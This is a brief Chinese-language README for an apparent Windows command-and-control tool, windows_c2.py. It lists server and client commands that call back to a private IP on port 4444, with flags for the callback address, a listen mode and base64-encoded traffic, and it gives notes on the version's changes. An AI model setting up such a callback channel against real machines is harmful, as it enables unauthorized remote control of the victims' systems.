### 用法

base64_server:

>python windows_c2.py -i 192.168.3.52 -p 4444 -e base64

base64_client:

>python windows_c2.py -p 4444 -e base64



server:

>python windows_c2.py -i 192.168.3.52 -p 4444

client:

>python windows_c2.py -i 192.168.3.52 -p 4444 



### 命令参数

>-i :    指定回连ip
>
>-p： 指定回连端口
>
>-l :     监听模式
>
>-e :   指定编码方式

目前仅支持base64 加密通讯，xor加密待完善。

这里对比上个版本进行了重构，并且修复了一些bug，加入了异常捕获。